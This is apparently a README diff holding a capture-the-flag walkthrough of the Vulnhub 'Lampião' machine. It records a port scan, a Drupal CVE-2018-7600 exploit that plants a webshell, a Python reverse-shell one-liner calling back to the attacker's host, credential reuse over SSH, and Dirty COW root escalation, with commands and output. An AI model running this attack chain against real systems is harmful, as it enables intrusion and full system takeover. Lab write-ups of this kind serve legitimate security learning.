@@ -1,0 +1,187 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.49<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Lampiao]<br/>
+└─# nmap -sC -sV 10.0.2.49 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 20:22 +0630<br/>
+Nmap scan report for 10.0.2.49<br/>
+Host is up (0.000085s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE &nbsp; &nbsp;VERSION<br/>
+22/tcp &nbsp; open &nbsp;ssh &nbsp; &nbsp; &nbsp; &nbsp;OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 1024 46b199607d81693cae1fc7ffc366e310 (DSA)<br/>
+| &nbsp; 2048 f3e888f22dd0b2540b9cad6133595593 (RSA)<br/>
+| &nbsp; 256 ce632af7536e46e2ae81e3ffb716f452 (ECDSA)<br/>
+|_ &nbsp;256 c655ca073765e306c1d65b77dc23dfcc (ED25519)<br/>
+80/tcp &nbsp; open &nbsp;tcpwrapped<br/>
+1898/tcp open &nbsp;http &nbsp; &nbsp; &nbsp; Apache httpd 2.4.7 ((Ubuntu))<br/>
+|_http-server-header: Apache/2.4.7 (Ubuntu)<br/>
+|_http-title: Lampi\xC3\xA3o<br/>
+| http-robots.txt: 36 disallowed entries (15 shown)<br/>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br/>
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br/>
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br/>
+|_/LICENSE.txt /MAINTAINERS.txt<br/>
+|_http-generator: Drupal 7 (http://drupal.org)<br/>
+MAC Address: 08:00:27:BF:9A:E2 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 52.79 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found vulnerable drupal cms version 7.54 at (port 1898)<br/>
+<br/>
+I scan drupal with drupwn tool and found that this version is vulnerable into cve-2018-7600 and then exploit it and I got RCE:<br/>
+<br/>
+Tool link - https://github.com/immunIT/drupwn <br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/drupwn-master]<br/>
+└─# drupwn --target http://10.0.2.49:1898/ --mode exploit<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ____<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;/ __ \_______ &nbsp;______ _ &nbsp; &nbsp; &nbsp;______<br/>
+&nbsp; &nbsp; &nbsp; / / / / ___/ / / / __ \ | /| / / __ \<br/>
+&nbsp; &nbsp; &nbsp;/ /_/ / / &nbsp;/ /_/ / /_/ / |/ |/ / / / /<br/>
+&nbsp; &nbsp; /_____/_/ &nbsp; \__,_/ .___/|__/|__/_/ /_/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/_/<br/>
+&nbsp; &nbsp; <br/>
+[-] Version not specified, trying to identify it<br/>
+<br/>
+[+] Version detected: 7.54 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Drupwn&gt; list &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
++---------------+----------------------------------------+---------------------------------+<br/>
+| &nbsp; &nbsp; &nbsp;CVE &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Description &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; &nbsp; &nbsp; &nbsp;Versions affected &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++---------------+----------------------------------------+---------------------------------+<br/>
+| CVE-2019-6340 | &nbsp; &nbsp; &nbsp; &nbsp;Remote Command Execution &nbsp; &nbsp; &nbsp; &nbsp;| 8.5.x &lt; 8.5.11 &amp; 8.6.x &lt; 8.6.10 |<br/>
+| CVE-2018-7602 | Authenticated Remote Command Execution | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 7.x &lt;= 7.58 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+| CVE-2018-7600 | &nbsp; &nbsp; &nbsp; &nbsp;Remote Command Execution &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp;7.x &lt; 7.58 &amp; 8.x &lt; 8.1 &nbsp; &nbsp; |<br/>
++---------------+----------------------------------------+---------------------------------+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Drupwn&gt; check CVE-2018-7600 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+[+] Application vulnerable &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Drupwn&gt; exploit CVE-2018-7600 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+[+] Exploit completed. Webshell accessible at: http://10.0.2.49:1898//CW8MBK.php?c=CMD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Drupwn&gt;<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse shell with python <br/>
+<br/>
+payload - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+Full URL - http://10.0.2.49:1898//CW8MBK.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.4%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Lampiao]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.49] 60658<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+User Access<br/>
+<br/>
+Got user "tiago" password from /var/www/html/sites/default/settings.php<br/>
+<br/>
+'username' =&gt; 'drupaluser',<br/>
+'password' =&gt; 'Virgulino',<br/>
+<br/>
+So, I connect via ssh with his credential<br/>
+<br/>
+username - tiago<br/>
+password - Virgulino<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh tiago@10.0.2.49 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+The authenticity of host '10.0.2.49 (10.0.2.49)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:GGW0ASyjbhMycAKiglcXcsa0HvSwkLHZP9bQBtVrPs8.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '10.0.2.49' (ED25519) to the list of known hosts.<br/>
+tiago@10.0.2.49's password: <br/>
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)<br/>
+<br/>
+&nbsp;* Documentation: &nbsp;https://help.ubuntu.com/<br/>
+<br/>
+&nbsp;System information disabled due to load higher than 1.0<br/>
+<br/>
+New release '16.04.7 LTS' available.<br/>
+Run 'do-release-upgrade' to upgrade to it.<br/>
+<br/>
+Last login: Fri Apr 20 14:40:55 2018 from 192.168.108.1<br/>
+tiago@lampiao:~$<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation ([+] [CVE-2016-5195] dirtycow 2)<br/>
+<br/>
+After running linpeas, I found so many kernel exploit but some of those are not working except this one "[+] [CVE-2016-5195] dirtycow 2":<br/>
+<br/>
+https://www.exploit-db.com/download/40847<br/>
+<br/>
+Step 1:<br/>
+<br/>
+I copy and paste the source code<br/>
+<br/>
+tiago@lampiao:/tmp$ nano 40847.cpp<br/>
+<br/>
+Step 2:<br/>
+<br/>
+compile it<br/>
+<br/>
+tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Exploit<br/>
+<br/>
+tiago@lampiao:/tmp$ ./dcow -s<br/>
+Running ...<br/>
+Password overridden to: dirtyCowFun<br/>
+<br/>
+Received su prompt (Password: )<br/>
+<br/>
+echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs<br/>
+cp /tmp/.ssh_bak /etc/passwd<br/>
+rm /tmp/.ssh_bak<br/>
+root@lampiao:~# echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs<br/>
+root@lampiao:~# cp /tmp/.ssh_bak /etc/passwd<br/>
+root@lampiao:~# rm /tmp/.ssh_bak<br/>
+root@lampiao:~# whoami<br/>
+root<br/>
+<br/>
+root@lampiao:~# cat flag.txt <br/>
+9740616875908d91ddcdaa8aea3af366 (Vulnhub Flags)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+<br/>
+tiago@lampiao:~$ cat local.txt <br/>
+c34259f1cbe52f14f47888f6580ded69<br/>
+<br/>
+root@lampiao:~# cat proof.txt <br/>
+ef6eb520e9ea8264809b11568db90a22<br/>
+<br/>
+</body></html>
